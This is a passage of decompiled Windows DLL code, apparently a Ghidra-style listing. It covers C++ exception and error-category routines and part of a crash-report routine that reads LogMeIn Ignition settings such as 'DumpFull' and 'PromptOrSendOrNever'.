  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10008750 */

undefined4 * __thiscall FUN_10008750(undefined4 *param_1,byte param_2)

{
  *param_1 = std::error_category::vftable;
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10008780 */

undefined4 __thiscall FUN_10008780(undefined4 *param_1,undefined4 param_2)

{
  (**(code **)(*(int *)param_1[1] + 8))(param_2,*param_1,0);
  return param_2;
}



/* Function: FUN_100087b0 */

void __thiscall FUN_100087b0(undefined4 param_1,undefined4 *param_2,undefined4 param_3)

{
  *param_2 = param_3;
  param_2[1] = param_1;
  return;
}



/* Function: FUN_100087d0 */

uint __thiscall FUN_100087d0(int *param_1,undefined4 param_2,int *param_3)

{
  int *piVar1;
  undefined1 local_c [8];
  
  piVar1 = (int *)(**(code **)(*param_1 + 0xc))(local_c,param_2);
  if ((piVar1[1] == param_3[1]) && (piVar1 = (int *)*piVar1, piVar1 == (int *)*param_3)) {
    return CONCAT31((int3)((uint)piVar1 >> 8),1);
  }
  return (uint)piVar1 & 0xffffff00;
}



/* Function: FUN_10008810 */

uint __thiscall FUN_10008810(int param_1,int *param_2,int param_3)

{
  if ((param_1 == param_2[1]) && (param_2 = (int *)*param_2, param_2 == (int *)param_3)) {
    return CONCAT31((int3)((uint)param_2 >> 8),1);
  }
  return (uint)param_2 & 0xffffff00;
}



/* Function: FUN_10008830 */

void __thiscall
FUN_10008830(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint uVar1;
  undefined4 uVar2;
  int in_stack_0000001c;
  uint in_stack_00000020;
  undefined4 local_2c [5];
  uint local_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100741c0;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 0;
  local_14 = uVar1;
  if (in_stack_0000001c != 0) {
    FUN_1000b3d0(&DAT_10083794,2);
  }
  uVar2 = FUN_10008780(local_2c);
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_1000b310(uVar2,0,0xffffffff);
  if (0xf < local_18) {
    thunk_FUN_100579ee(local_2c[0],uVar1);
  }
  param_1[5] = 0xf;
  param_1[4] = 0;
  *(undefined1 *)param_1 = 0;
  if (in_stack_00000020 < 0x10) {
    if (in_stack_0000001c + 1 != 0) {
      FUN_10057b70(param_1,&param_4,in_stack_0000001c + 1);
    }
  }
  else {
    *param_1 = param_4;
  }
  param_1[4] = in_stack_0000001c;
  param_1[5] = in_stack_00000020;
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10008910 */

void __thiscall
FUN_10008910(exception *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  uint uVar1;
  undefined1 uVar2;
  char *local_34;
  undefined4 local_30;
  uint local_1c;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100741f8;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  uVar2 = 0;
  local_18 = uVar1;
  FUN_1000b4c0(param_2,0,0xffffffff);
  local_34 = (char *)FUN_10008830(param_3,param_4,uVar2);
  local_8 = 0;
  if (0xf < *(uint *)(local_34 + 0x14)) {
    local_34 = *(char **)local_34;
  }
  std::exception::exception(param_1,&local_34);
  *(undefined ***)param_1 = std::runtime_error::vftable;
  if (0xf < local_1c) {
    thunk_FUN_100579ee(local_30,uVar1);
  }
  *(undefined4 *)(param_1 + 0xc) = param_3;
  *(undefined ***)param_1 = std::_System_error::vftable;
  *(undefined4 *)(param_1 + 0x10) = param_4;
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_100089e0 */

void __thiscall
FUN_100089e0(undefined4 *param_1,char *param_2,undefined4 param_3,undefined4 param_4)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  char *pcVar4;
  uint local_30 [4];
  undefined4 local_20;
  uint local_1c;
  uint local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100741f8;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = local_30[0] & 0xffffff00;
  if (*param_2 == '\0') {
    iVar3 = 0;
  }
  else {
    pcVar4 = param_2;
    do {
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + 1;
    } while (cVar1 != '\0');
    iVar3 = (int)pcVar4 - (int)(param_2 + 1);
  }
  local_18 = uVar2;
  FUN_1000b7b0(param_2,iVar3);
  local_8 = 0;
  FUN_10008910(local_30,param_3,param_4);
  if (0xf < local_1c) {
    thunk_FUN_100579ee(local_30[0],uVar2);
  }
  *param_1 = std::system_error::vftable;
  ExceptionList = local_10;
  FUN_100579df();
  return;
}



/* Function: FUN_10008aa0 */

char * FUN_10008aa0(void)

{
  return "generic";
}



/* Function: FUN_10008ab0 */

undefined1 * FUN_10008ab0(undefined1 *param_1,undefined4 param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  
  pcVar2 = (char *)FUN_100570f3(param_2);
  pcVar3 = "unknown error";
  if (pcVar2 != (char *)0x0) {
    pcVar3 = pcVar2;
  }
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  if (*pcVar3 == '\0') {
    FUN_1000b7b0(pcVar3,0);
    return param_1;
  }
  pcVar2 = pcVar3;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_1000b7b0(pcVar3,(int)pcVar2 - (int)(pcVar3 + 1));
  return param_1;
}



/* Function: FUN_10008b20 */

char * FUN_10008b20(void)

{
  return "iostream";
}



/* Function: FUN_10008b30 */

undefined1 * FUN_10008b30(undefined1 *param_1,int param_2)

{
  if (param_2 == 1) {
    *(undefined4 *)(param_1 + 0x14) = 0xf;
    *(undefined4 *)(param_1 + 0x10) = 0;
    *param_1 = 0;
    FUN_1000b7b0("iostream stream error",0x15);
    return param_1;
  }
  FUN_10008ab0(param_1,param_2);
  return param_1;
}



/* Function: FUN_10008b80 */

char * FUN_10008b80(void)

{
  return "system";
}



/* Function: FUN_10008b90 */

undefined1 * FUN_10008b90(undefined1 *param_1,undefined4 param_2)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  
  pcVar2 = (char *)FUN_1005711d(param_2);
  pcVar3 = "unknown error";
  if (pcVar2 != (char *)0x0) {
    pcVar3 = pcVar2;
  }
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  if (*pcVar3 == '\0') {
    FUN_1000b7b0(pcVar3,0);
    return param_1;
  }
  pcVar2 = pcVar3;
  do {
    cVar1 = *pcVar2;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  FUN_1000b7b0(pcVar3,(int)pcVar2 - (int)(pcVar3 + 1));
  return param_1;
}



/* Function: FUN_10008c00 */

void FUN_10008c00(undefined4 *param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = FUN_100570f3(param_2);
  *param_1 = param_2;
  if (iVar1 != 0) {
    param_1[1] = &PTR_vftable_10096ffc;
    return;
  }
  param_1[1] = &PTR_vftable_10097004;
  return;
}



/* Function: FUN_10008c40 */

void __fastcall FUN_10008c40(int param_1)

{
  code *pcVar1;
  uint uVar2;
  undefined4 in_stack_ffffffe4;
  undefined **local_18;
  undefined ***pppuStack_14;
  undefined *puStack_10;
  
  uVar2 = *(uint *)(param_1 + 0x10) & *(uint *)(param_1 + 0xc);
  if ((uVar2 & 4) == 0) {
    if ((uVar2 & 2) == 0) goto LAB_10008c9e;
  }
  else {
    FUN_100089e0("ios_base::badbit set",1,&PTR_vftable_10097000);
    local_18 = std::ios_base::failure::vftable;
    FUN_1005de1b(&local_18,&DAT_1009304c);
  }
  FUN_100089e0("ios_base::failbit set",in_stack_ffffffe4);
  local_18 = std::ios_base::failure::vftable;
  FUN_1005de1b(&local_18);
LAB_10008c9e:
  local_18 = (undefined **)0x1008380c;
  FUN_100089e0();
  puStack_10 = &DAT_1009304c;
  pppuStack_14 = &local_18;
  local_18 = (undefined **)0x10008cbd;
  FUN_1005de1b();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



/* Function: FUN_10008cc0 */

undefined4 * __thiscall FUN_10008cc0(int param_1,undefined4 *param_2)

{
  int *piVar1;
  
  piVar1 = (int *)**(undefined4 **)(param_1 + 0x30);
  *param_2 = piVar1;
  (**(code **)(*piVar1 + 4))();
  return param_2;
}



/* Function: FUN_10008ce0 */

void __fastcall FUN_10008ce0(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  *(undefined4 *)(param_1 + 0x30) = 0;
  *(undefined4 *)(param_1 + 8) = 0;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *(undefined4 *)(param_1 + 0x14) = 0x201;
  *(undefined4 *)(param_1 + 0x18) = 6;
  *(undefined4 *)(param_1 + 0x1c) = 0;
  *(undefined4 *)(param_1 + 0x20) = 0;
  *(undefined4 *)(param_1 + 0x24) = 0;
  *(undefined4 *)(param_1 + 0x28) = 0;
  *(undefined4 *)(param_1 + 0x2c) = 0;
  *(undefined4 *)(param_1 + 0xc) = 0;
  puVar1 = (undefined4 *)FUN_100582fa(4);
  if (puVar1 != (undefined4 *)0x0) {
    uVar2 = FUN_10056cb5(1);
    *puVar1 = uVar2;
    *(undefined4 **)(param_1 + 0x30) = puVar1;
    return;
  }
  *(undefined4 *)(param_1 + 0x30) = 0;
  return;
}



/* Function: FUN_10008d60 */

exception * __thiscall FUN_10008d60(exception *param_1,exception *param_2)

{
  std::exception::exception(param_1,param_2);
  *(undefined ***)param_1 = std::_System_error::vftable;
  *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_2 + 0x10);
  *(undefined ***)param_1 = std::ios_base::failure::vftable;
  return param_1;
}



/* Function: FUN_10008d90 */

exception * __thiscall FUN_10008d90(exception *param_1,exception *param_2)

{
  std::exception::exception(param_1,param_2);
  *(undefined ***)param_1 = std::_System_error::vftable;
  *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_2 + 0x10);
  *(undefined ***)param_1 = std::system_error::vftable;
  return param_1;
}



/* Function: FUN_10008dc0 */

exception * __thiscall FUN_10008dc0(exception *param_1,exception *param_2)

{
  std::exception::exception(param_1,param_2);
  *(undefined ***)param_1 = std::_System_error::vftable;
  *(undefined4 *)(param_1 + 0xc) = *(undefined4 *)(param_2 + 0xc);
  *(undefined4 *)(param_1 + 0x10) = *(undefined4 *)(param_2 + 0x10);
  return param_1;
}



/* Function: FUN_10008df0 */

ios_base * __thiscall FUN_10008df0(ios_base *param_1,byte param_2)

{
  *(undefined ***)param_1 = std::ios_base::vftable;
  std::ios_base::_Ios_base_dtor(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_100579ee(param_1);
  }
  return param_1;
}



/* Function: FUN_10008e20 */

void __fastcall FUN_10008e20(undefined4 *param_1)

{
  FUN_1000ba10();
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_10008e40 */

undefined4 * __thiscall
FUN_10008e40(undefined4 *param_1,int *param_2,undefined4 param_3,int *param_4)

{
  undefined4 *puVar1;
  uint uVar2;
  undefined4 uVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined **extraout_ECX_00;
  undefined **ppuVar5;
  undefined **extraout_ECX_01;
  undefined **extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 uVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10074299;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_2;
  param_1[1] = param_4;
  iVar4 = *param_4;
  if ((iVar4 == 0) || (*(int *)(iVar4 + 8) == 0)) {
    ppuVar5 = &PTR_10083554;
  }
  else if (iVar4 == 0) {
    ppuVar5 = (undefined **)0x0;
  }
  else {
    ppuVar5 = (undefined **)(iVar4 + 0xc);
  }
  puVar1 = param_1 + 2;
  *puVar1 = 0;
  param_1[3] = 0;
  param_2 = puVar1;
  uVar3 = FUN_1000fa00(0,0);
  *puVar1 = uVar3;
  local_8 = 0;
  FUN_10020000(ppuVar5,0);
  local_8 = 1;
  param_1[4] = 0;
  DAT_1009aba4 = FUN_1000bdd0(param_3,extraout_ECX);
  param_2 = (int *)0x0;
  local_8._0_1_ = 2;
  DAT_10099188 = puVar1;
  iVar4 = FUN_1000c520(&param_2,uVar2);
  if (iVar4 == 0) {
    ppuVar5 = extraout_ECX_00;
    if (param_1[3] == 0) goto LAB_10008f81;
    if (*(int *)(*(int *)*puVar1 + 8) == 0) {
      ppuVar5 = (undefined **)0x0;
    }
    else {
      ppuVar5 = (undefined **)(*(int *)(*(int *)*puVar1 + 8) + 0xc);
    }
    if ((DAT_1009b5bc & 1) != 0) goto LAB_10008f81;
    local_8._0_1_ = 4;
  }
  else {
    if ((DAT_1009aba4 == 0) || (*(int *)(DAT_1009aba4 + 8) == 0)) {
      ppuVar5 = &PTR_10083554;
    }
    else if (DAT_1009aba4 == 0) {
      ppuVar5 = (undefined **)0x0;
    }
    else {
      ppuVar5 = (undefined **)(DAT_1009aba4 + 0xc);
    }
    if ((DAT_1009b5bc & 1) != 0) goto LAB_10008f81;
    local_8._0_1_ = 3;
  }
  DAT_1009b5bc = DAT_1009b5bc | 1;
  FUN_10033a00(ppuVar5,ppuVar5);
  ppuVar5 = extraout_ECX_01;
LAB_10008f81:
  local_8._0_1_ = 1;
  if (param_2 != (int *)0x0) {
    LOCK();
    iVar4 = *param_2;
    ppuVar5 = (undefined **)*param_2;
    *param_2 = iVar4 + -1;
    UNLOCK();
    if (iVar4 + -1 < 0) {
      FUN_100579ee(param_2);
      ppuVar5 = extraout_ECX_02;
    }
  }
  if ((DAT_1009b5bc & 1) == 0) {
    DAT_1009b5bc = DAT_1009b5bc | 1;
    local_8._0_1_ = 5;
    FUN_10033a00(0,ppuVar5);
  }
  uVar3 = 1;
  uVar6 = 0x8a;
  iVar4 = DAT_1009b5c0;
  if (DAT_1009b5c0 == 0) {
    iVar4 = 1;
  }
  switch(iVar4) {
  case 2:
    uVar6 = 0x93;
    uVar3 = 2;
    break;
  case 3:
    uVar6 = 0x94;
    uVar3 = 3;
    break;
  case 4:
    uVar6 = 0x97;
    uVar3 = 4;
    break;
  case 5:
    uVar3 = 5;
    break;
  case 6:
    uVar3 = 6;
    break;
  case 7:
    uVar3 = 7;
    break;
  case 8:
    uVar6 = 0x9c;
    uVar3 = 8;
    break;
  case 9:
    uVar6 = 0xa0;
    uVar3 = 9;
    break;
  case 10:
    uVar6 = 0xa1;
    uVar3 = 10;
  }
  if ((DAT_1009b5d4 & 1) == 0) {
    DAT_1009b5d4 = DAT_1009b5d4 | 1;
    local_8._0_1_ = 6;
    FUN_1001be20(uVar3);
    DAT_1009b5fc = 0;
    DAT_1009b600 = 0;
    FUN_10057b51(&LAB_10078890);
    uVar3 = extraout_ECX_03;
  }
  if ((DAT_1009b5c4 & 1) == 0) {
    DAT_1009b5c4 = DAT_1009b5c4 | 1;
    DAT_1009b5c8 = 0;
    local_8._0_1_ = 8;
    FUN_100356a0(uVar3);
    FUN_10057b51(&LAB_10078850);
  }
  if (DAT_1009b5c8 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = DAT_1009b5c8 + 0xc;
  }
  if ((DAT_1009b5b0 & 1) == 0) {
    DAT_1009b5b0 = DAT_1009b5b0 | 1;
    local_8 = CONCAT31(local_8._1_3_,9);
    FUN_10028f80(*param_1,iVar4,uVar6);
    FUN_10057b51(&LAB_10078840);
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10009140 */

/* WARNING: Control flow encountered bad instruction data */

void __fastcall FUN_10009140(undefined4 *param_1)

{
  int *piVar1;
  char cVar2;
  undefined1 uVar3;
  uint uVar4;
  int iVar5;
  int ****ppppiVar6;
  int **ppiVar7;
  int ****ppppiVar8;
  int ***pppiVar9;
  int ***pppiVar10;
  undefined4 *puVar11;
  undefined **ppuVar12;
  int *piVar13;
  int *extraout_ECX;
  int *extraout_ECX_00;
  int *extraout_ECX_01;
  int *extraout_ECX_02;
  int *extraout_ECX_03;
  int *extraout_ECX_04;
  undefined4 extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  int *extraout_ECX_13;
  int **extraout_ECX_14;
  int **extraout_ECX_15;
  int **extraout_ECX_16;
  int **extraout_ECX_17;
  int **extraout_ECX_18;
  int **extraout_ECX_19;
  int **extraout_ECX_20;
  undefined4 extraout_ECX_21;
  undefined4 extraout_ECX_22;
  undefined4 extraout_ECX_23;
  undefined4 extraout_ECX_24;
  undefined4 extraout_ECX_25;
  undefined4 extraout_ECX_26;
  undefined4 extraout_ECX_27;
  undefined4 extraout_ECX_28;
  int **extraout_ECX_29;
  int **ppiVar14;
  undefined4 extraout_ECX_30;
  undefined4 extraout_ECX_31;
  undefined4 extraout_ECX_32;
  undefined4 unaff_EDI;
  bool bVar15;
  undefined4 uVar16;
  wchar_t *pwVar17;
  int ****ppppiVar18;
  int ****ppppiVar19;
  wchar_t *pwVar20;
  wchar_t *pwVar21;
  undefined4 uVar22;
  undefined4 uVar23;
  int local_138;
  undefined4 local_11c;
  int local_fc;
  undefined1 local_f8 [4];
  int **local_f4;
  int **local_f0;
  undefined4 local_ec;
  int **local_e8;
  int local_e4;
  int *local_e0;
  int ***local_dc;
  int **local_d8;
  int ***local_d4;
  int ***local_d0;
  int *local_cc;
  int ***local_c8;
  int *local_c4;
  undefined4 *local_c0;
  undefined4 local_bc;
  undefined4 local_b8;
  undefined4 local_b4;
  undefined4 local_b0;
  undefined4 local_ac;
  undefined4 local_a8;
  undefined4 local_a4;
  undefined4 local_a0;
  undefined4 local_9c;
  undefined4 local_98;
  undefined4 local_94;
  undefined4 local_90;
  undefined4 local_8c;
  undefined4 local_88;
  undefined4 local_84;
  undefined4 local_80;
  undefined4 local_7c;
  undefined4 local_78;
  undefined4 local_74;
  undefined4 local_70;
  undefined4 local_6c;
  undefined4 local_68;
  undefined4 local_64;
  undefined4 local_60;
  undefined4 local_5c;
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  int *local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8._0_1_ = 0xff;
  local_8._1_3_ = 0xffffff;
  puStack_c = &LAB_1007432f;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_c0 = param_1;
  local_14 = uVar4;
  DAT_1009aba4 = FUN_1000bfa0(&DAT_10083854,0xffffffff);
  if ((((DAT_1009aba4 != 0) && (*(int *)(DAT_1009aba4 + 8) != 0)) &&
      (iVar5 = FUN_1004b5c0(L"/NOSEND",7,uVar4), iVar5 != -1)) || (param_1[3] == 0))
  goto LAB_10009c2a;
  if ((DAT_1009accc & 1) == 0) {
    DAT_1009accc = DAT_1009accc | 1;
    local_8 = 0;
    DAT_1009acc8 = FUN_100146c0();
    local_8._0_1_ = 0xff;
    local_8._1_3_ = 0xffffff;
  }
  if (DAT_1009acc8 == 0) goto LAB_10009c2a;
  FUN_10023360(L"an LMIGuardian instance is on the screen");
  local_8._0_1_ = 1;
  local_8._1_3_ = 0;
  if (local_fc != 0) {
    ppppiVar6 = (int ****)FUN_1003a0c0();
    local_d4 = (int ***)0x0;
    local_d0 = (int ***)ppppiVar6;
    if (ppppiVar6[8] == (int ***)0x2) {
      ppiVar7 = (int **)FUN_1000bd10();
      local_cc = (int *)ppiVar7;
      local_c8 = (int ***)(ppppiVar6 + 3);
      pppiVar9 = (int ***)FUN_1001d340(&local_cc);
      pppiVar10 = ppppiVar6[3];
      piVar13 = extraout_ECX_00;
      if ((pppiVar9 == pppiVar10) ||
         (cVar2 = FUN_1001d1f0(&local_cc,pppiVar9 + 4), piVar13 = extraout_ECX_01, cVar2 != '\0')) {
        local_f4 = (int **)pppiVar10;
        pppiVar10 = &local_f4;
      }
      else {
        local_f0 = (int **)pppiVar9;
        pppiVar10 = &local_f0;
      }
      pppiVar10 = (int ***)*pppiVar10;
      if (ppiVar7 != (int **)0x0) {
        LOCK();
        piVar1 = *ppiVar7;
        *ppiVar7 = (int *)((int)piVar1 + -1);
        UNLOCK();
        if ((int)piVar1 + -1 < 0) {
          FUN_100579ee(ppiVar7);
          piVar13 = extraout_ECX_02;
        }
      }
      ppppiVar6 = (int ****)local_d0;
      param_1 = local_c0;
      if ((int ***)*local_c8 == pppiVar10) {
        if ((int ***)local_d0[9] == (int ***)0x0) {
          local_c4 = (int *)FUN_10058463(0x40,&DAT_10098020);
          local_8._0_1_ = 2;
          if (local_c4 == (int *)0x0) {
            pppiVar10 = (int ***)0x0;
            piVar13 = extraout_ECX_03;
          }
          else {
            uVar16 = FUN_1003abd0();
            pppiVar10 = (int ***)FUN_1003c970(uVar16);
            piVar13 = extraout_ECX_04;
          }
          local_8._0_1_ = 1;
          ((int ***)ppppiVar6)[9] = (int **)pppiVar10;
          param_1 = local_c0;
          if (pppiVar10 == (int ***)0x0) goto LAB_100094ea;
          FUN_1003ade0();
          FUN_1003aff0();
        }
        if ((((int ***)((int ***)ppppiVar6)[9] != (int ***)0x0) &&
            (iVar5 = FUN_1003cb30(((int ***)ppppiVar6)[9],&DAT_10088e54), iVar5 != 0)) &&
           ((iVar5 = FUN_1003cb30(extraout_ECX_05,&DAT_10088e54), iVar5 != 0 &&
            (iVar5 = FUN_1003cb30(extraout_ECX_06,L"Software"), iVar5 != 0)))) {
          pwVar20 = L"LogMeIn Ignition";
          pwVar17 = L"Software";
          uVar16 = extraout_ECX_07;
          uVar23 = extraout_ECX_07;
          FUN_1003cb30(extraout_ECX_07,&DAT_10088e54);
          FUN_1003cb30(uVar16,pwVar17);
          iVar5 = FUN_1003cb10(uVar23,pwVar20);
          if (iVar5 != 0) {
            pwVar21 = L"Settings";
            pwVar20 = L"LogMeIn Ignition";
            pwVar17 = L"Software";
            uVar16 = extraout_ECX_08;
            uVar23 = extraout_ECX_08;
            uVar22 = extraout_ECX_08;
            FUN_1003cb30(extraout_ECX_08,&DAT_10088e54);
            FUN_1003cb30(uVar16,pwVar17);
            FUN_1003cb30(uVar23,pwVar20);
            iVar5 = FUN_1003cb10(uVar22,pwVar21);
            if (iVar5 != 0) {
              pwVar21 = L"Settings";
              pwVar20 = L"LogMeIn Ignition";
              pwVar17 = L"Software";
              uVar16 = extraout_ECX_09;
              uVar23 = extraout_ECX_09;
              uVar22 = extraout_ECX_09;
              FUN_1003cb30(extraout_ECX_09,&DAT_10088e54);
              FUN_1003cb30(uVar16,pwVar17);
              FUN_1003cb30(uVar23,pwVar20);
              FUN_1003cb30(uVar22,pwVar21);
              iVar5 = FUN_1003cb10(extraout_ECX_10,L"DumpFull");
              if (iVar5 == 0) {
                FUN_1003cd30(L"dword",extraout_ECX_11,L"DumpFull");
                puVar11 = (undefined4 *)FUN_1003cce0();
                uVar16 = FUN_10039c20(0,extraout_ECX_12);
                *puVar11 = uVar16;
              }
              else {
                uVar16 = extraout_ECX_11;
                FUN_1003cb30(extraout_ECX_11,L"DumpFull");
                uVar23 = 0x10009464;
                FUN_1003cce0();
                local_d4 = (int ***)FUN_10039b90(uVar16,uVar23);
              }
            }
          }
        }
        local_e0 = (int *)FUN_1000bd10();
        local_8._0_1_ = 3;
        puVar11 = (undefined4 *)FUN_1001d0f0(&local_e0);
        local_8._0_1_ = 1;
        *puVar11 = local_d4;
        piVar13 = local_e0;
        param_1 = local_c0;
        if (local_e0 != (int *)0x0) {
          LOCK();
          iVar5 = *local_e0;
          *local_e0 = iVar5 + -1;
          UNLOCK();
          if (iVar5 + -1 < 0) {
            FUN_100579ee(local_e0);
            piVar13 = extraout_ECX_13;
            param_1 = local_c0;
          }
        }
      }
    }
    else {
      FUN_1001c390(L"DumpFull",0,0,0);
      piVar13 = extraout_ECX;
    }
LAB_100094ea:
    FUN_10020d90(piVar13);
    if (param_1[3] != 0) {
      FUN_10035630();
      FUN_10028f00(0x8a);
      param_1[4] = 1;
      local_dc = (int ***)0x3;
      local_d8 = (int **)FUN_1000c740();
      ppppiVar19 = (int ****)0x1;
      ppppiVar18 = (int ****)0x1;
      uVar16 = 3;
      ppiVar7 = (int **)FUN_1003a570(L"PromptOrSendOrNever",3,1,1);
      if (ppiVar7 == (int **)0x3) {
        local_cc = (int *)0x0;
        if (ppppiVar6[8] == (int ***)0x2) {
          ppppiVar8 = (int ****)FUN_1000bd10();
          ppppiVar19 = &local_d4;
          ppppiVar18 = (int ****)0x100095be;
          local_dc = (int ***)(ppppiVar6 + 3);
          local_d4 = (int ***)ppppiVar8;
          pppiVar9 = (int ***)FUN_1001d340(ppppiVar19);
          pppiVar10 = ppppiVar6[3];
          ppiVar14 = extraout_ECX_16;
          if (pppiVar9 == pppiVar10) {
LAB_100095e8:
            local_d8 = (int **)pppiVar10;
            pppiVar10 = &local_d8;
          }
          else {
            ppppiVar19 = (int ****)(pppiVar9 + 4);
            ppppiVar18 = &local_d4;
            uVar16 = 0x100095d6;
            cVar2 = FUN_1001d1f0(ppppiVar18,ppppiVar19);
            ppiVar14 = extraout_ECX_17;
            if (cVar2 != '\0') goto LAB_100095e8;
            local_e8 = (int **)pppiVar9;
            pppiVar10 = &local_e8;
          }
          pppiVar10 = (int ***)*pppiVar10;
          if (ppppiVar8 != (int ****)0x0) {
            LOCK();
            pppiVar9 = *ppppiVar8;
            *ppppiVar8 = (int ***)((int)pppiVar9 + -1);
            UNLOCK();
            if ((int)pppiVar9 + -1 < 0) {
              ppppiVar18 = (int ****)0x1000960b;
              FUN_100579ee(ppppiVar8);
              ppiVar14 = extraout_ECX_18;
              ppppiVar19 = ppppiVar8;
            }
          }
          pppiVar9 = local_d0;
          if ((int ***)*local_dc == pppiVar10) {
            if ((int ***)local_d0[9] == (int ***)0x0) {
              ppppiVar19 = (int ****)&DAT_10098020;
              ppppiVar18 = (int ****)0x40;
              uVar16 = 0x1000963e;
              local_c4 = (int *)FUN_10058463(0x40,&DAT_10098020);
              local_8._0_1_ = 4;
              if (local_c4 == (int *)0x0) {
                pppiVar10 = (int ***)0x0;
                ppiVar14 = extraout_ECX_19;
              }
              else {
                ppppiVar19 = (int ****)FUN_1003abd0();
                ppppiVar18 = (int ****)0x10009660;
                pppiVar10 = (int ***)FUN_1003c970(ppppiVar19);
                ppiVar14 = extraout_ECX_20;
              }
              local_8._0_1_ = 1;
              pppiVar9[9] = (int **)pppiVar10;
              if (pppiVar10 == (int ***)0x0) {
                ppiVar7 = (int **)0x0;
                param_1 = local_c0;
                goto LAB_1000983d;
              }
              FUN_1003ade0();
              FUN_1003aff0();
            }
            pppiVar10 = (int ***)pppiVar9[9];
            if (pppiVar10 != (int ***)0x0) {
              uVar16 = 0x100096a4;
              iVar5 = FUN_1003cb30(pppiVar10,&DAT_10088e54);
              if (iVar5 != 0) {
                uVar16 = 0x100096be;
                iVar5 = FUN_1003cb30(extraout_ECX_21,&DAT_10088e54);
                if (iVar5 != 0) {
                  uVar16 = 0x100096d3;
                  iVar5 = FUN_1003cb30(extraout_ECX_22,L"Software");
                  if (iVar5 != 0) {
                    pwVar20 = L"LogMeIn Ignition";
                    pwVar17 = L"Software";
                    uVar16 = extraout_ECX_23;
                    uVar23 = extraout_ECX_23;
                    FUN_1003cb30(extraout_ECX_23,&DAT_10088e54);
                    FUN_1003cb30(uVar16,pwVar17);
                    uVar16 = 0x10009707;
                    iVar5 = FUN_1003cb10(uVar23,pwVar20);
                    if (iVar5 != 0) {
                      pwVar21 = L"Settings";
                      pwVar20 = L"LogMeIn Ignition";
                      pwVar17 = L"Software";
                      uVar16 = extraout_ECX_24;
                      uVar23 = extraout_ECX_24;
                      uVar22 = extraout_ECX_24;
                      FUN_1003cb30(extraout_ECX_24,&DAT_10088e54);
                      FUN_1003cb30(uVar16,pwVar17);
                      FUN_1003cb30(uVar23,pwVar20);
                      uVar16 = 0x10009744;
                      iVar5 = FUN_1003cb10(uVar22,pwVar21);
                      if (iVar5 != 0) {
                        pwVar21 = L"Settings";
                        pwVar20 = L"LogMeIn Ignition";
                        pwVar17 = L"Software";
                        uVar16 = extraout_ECX_25;
                        uVar23 = extraout_ECX_25;
                        uVar22 = extraout_ECX_25;
                        FUN_1003cb30(extraout_ECX_25,&DAT_10088e54);
                        FUN_1003cb30(uVar16,pwVar17);
                        FUN_1003cb30(uVar23,pwVar20);
                        FUN_1003cb30(uVar22,pwVar21);
